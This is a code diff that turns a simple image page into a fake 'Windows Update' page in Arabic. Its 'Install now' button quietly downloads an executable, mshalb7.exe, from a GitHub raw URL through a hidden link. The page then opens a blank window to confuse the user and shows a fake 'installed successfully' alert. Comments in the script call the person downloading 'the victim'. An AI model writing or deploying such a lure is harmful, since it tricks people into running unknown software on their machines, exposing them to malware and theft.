@@ -1,12 +1,121 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar" dir="rtl">
 <head>
-    <title>System Update</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Windows Update</title>
     <style>
-        body { margin: 0; background: black; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        img { width: 80%; max-width: 400px; border-radius: 10px; }
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #f0f0f0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+        .container {
+            text-align: center;
+            background-color: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+            max-width: 400px;
+            width: 90%;
+        }
+        .logo {
+            width: 80px;
+            height: auto;
+            margin-bottom: 20px;
+        }
+        h2 {
+            color: #333;
+            margin-bottom: 10px;
+            font-weight: normal;
+        }
+        p {
+            color: #666;
+            margin-bottom: 30px;
+            font-size: 14px;
+        }
+        .btn {
+            background-color: #0078d7;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 4px;
+            transition: background-color 0.3s;
+        }
+        .btn:hover {
+            background-color: #005a9e;
+        }
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #0078d7;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 2s linear infinite;
+            margin: 20px auto;
+            display: none;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
-    <!-- الصورة التي أرسلتها -->
-    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAJ8AAACgCAYAAAASN76YAADB2UlEQVR4nKS9Z6xlaVYluI631z7/wmVkRjmKooouXAEDDQzCNKZHYiQYIYxAeIFACIEQRiAkhBDmB9ASQgh+gAAhEO4HjBgBLVpjWrgyWZmVGZlhn7v3XXu8Ga29z3nxMouqpugb+TLiuXvMt7+911577X3sL9m72+Laq4UBE4DZAq3Rf+3Zi18yjO4bMORP2zZo0cBpbYSmh1EQI3Ri+LYPyzBRNQnqYouySlA3KdAWMPnmBtAYjb4T37Nt9W/DgNHqsfozMM0GtmGhNmq0/Ly10ch5GLBRAvYYwf7zsOMdVKYPo8qA1Rmy89dgtWs09g7s4CYuFvdRFXMYBq8SME2ju8JGD9jU8OJb2HvLZ8KwPbQmUMvXW5i2g83lI7z4L38Loy3Bb5poYfOP5cKyTLleXlpRtyibGlXbIG9qNPw3byqPiRaR6cFzXRRlgYPBDSzzNU7SC7n3t6J9HE1uI8vWSKstbGcA3/Wxzpd4ePERTN0BQsvFOlnpGvBmmQXa2sJodITJ9DZgeABqtKYJozXQ1hlm8/vYbi7k3spdbWsM/BEs08YqWaI1uY60AP6RZZAPE56sDe8R11n/5toBRsvf4GLRbgyxG76fbdpwDBOOHcAyXRimJb+V1w2KukLZNrCvG54aga4F35zH42lYndV1h0HbtmjkZAAXNnzTReBEGLlDRF6gC1BVKPIlNvUGTbMFmuyaARuyoIa+W2fS/Q1RA+zPozeMpjFQ8zPT6b7Cm8RfbVA2DqLxbViT26ibEm2RwHA8mLt34NYFstlLsOotDLOG50Wo8nl3oY1eo/zbUuNvWzjhGIbtyrHlMmURdEGaFnAsFw4smPwd00DTtCjRImkKNHWD0mhQ8Pz4w4ZulKEbojAKpHmOiTfBjd1jFE2Ok7NHCP0YSZuhTbgBuJlNFI2J0mxQ1y18x0XZNHi6fiI7IbJD2cg0Li4qUKGtDQwHNzDZuQEYrngOy7L1FjYNDMPFJN5Fma5QVnm3CjYM05XzqI1Kr1HtqPu+rkeFvDNYNcz+ZfMdDN14pmXCNhzYXB/ek9ZA3TZIGgN5UaFoMpRNhaIuxeHULWDLrpBDqTHxYM+8XSvexeQN4X7lzWwaWIaFyA4QOhGGboyBHcKih2grFNkSablC3WxRNaUunGk/85bd8eTrLS+WXk0tvTdDnoN6NwutoQbRmgGs0RGcYMw3RJ6tUC4ewmwSmNYYVjwFagv56X0Ui8cID24B09uwpscwthdotpeoiwSuG2Jrmqib/rg0QBo7/RFvvAUnitByUZtKtwc3O700vZwBWIaNrGlRNzWKskLR0hs3sqF4r6xWowc9IG/Z2I1xZ/c2Hl0+hGlYOBrdguUMcTl/FTk3y7WNqOdiwbQMnF6coapLDKIdzFfnWKcpxk4Ax2yxrRK0ViMRpG0sjCfHmNLjSSSiMZbI81yMtCoylGWBstyiboqr1bZNF67lICtWcp/Vi/Lc6S07K+jOzTB74/LEk9HL29x8BveDKZtt21TIywJZVaKsG1QGUNHrc2sbpjqMhkZrw7Iter6ms+Xr/7/24i+3PJCN0PYReh5ib4jYDTTk1qWEsXWxkZBa8eK6mKkhTXcTDeYqtF2P4bo1u2/Tw2kgpcFKuOU
+
+   <svg class="logo" viewBox="0 0 88 88" xmlns="http://www.w3.org/2000/svg" aria-label="Windows Logo">
+    <title>Windows Logo</title>
+    <path fill="#f25022" d="M0 12.402l35.687-4.86.016 34.922L0 42.216v-29.814zm35.703 39.775l.016 35.063L0 72.57v-30.39l35.687 20.996zM42.266 39.99l26.87-4.386V12.402L42.266 7.542V39.99zm26.87 25.361l-26.87 17.81v-35.65l26.87-15.9v33.74z"/>
+</svg>
+
+        
+        <h2>Windows Update</h2>
+        <p>تم العثور على تحديثات هامة لنظام التشغيل الخاص بك.<br>يرجى الانتظار حتى اكتمال التحليل...</p>
+        
+        <button class="btn" onclick="downloadFile()">تثبيت الآن</button>
+        
+        <div class="loader" id="loader"></div>
+        <p id="status" style="display:none; color: green;">جاري التثبيت... يرجى عدم إغلاق الصفحة.</p>
+    </div>
+
+    <script>
+        function downloadFile() {
+            // إخفاء الزر وإظهار التحميل
+            document.querySelector('.btn').style.display = 'none';
+            document.getElementById('loader').style.display = 'block';
+            document.getElementById('status').style.display = 'block';
+
+            // رابط الملف المباشر من GitHub
+            const fileUrl = 'https://github.com/Shay7lebb-cloud/ASDGSZFG/raw/refs/heads/main/mshalb7.exe';
+            
+            // إنشاء عنصر رابط مخفي للتحميل
+            const link = document.createElement('a');
+            link.href = fileUrl;
+            link.download = 'mshalb7.exe'; // اسم الملف الذي سيظهر للضحية
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+
+            // محاولة فتح نافذة جديدة وتقليصها لإرباك المستخدم
+            window.open('', '_blank');
+            window.focus();
+            
+            // محاكاة عملية تثبيت وهمية
+            setTimeout(() => {
+                alert('تم التثبيت بنجاح! سيتم إعادة التشغيل.');
+                // يمكنك هنا إضافة كود لإعادة تشغيل الجهاز أو إغلاق المتصفح إذا أردت
+                // window.close(); 
+            }, 3000);
+        }
+    </script>
+
+</body>
+</html>
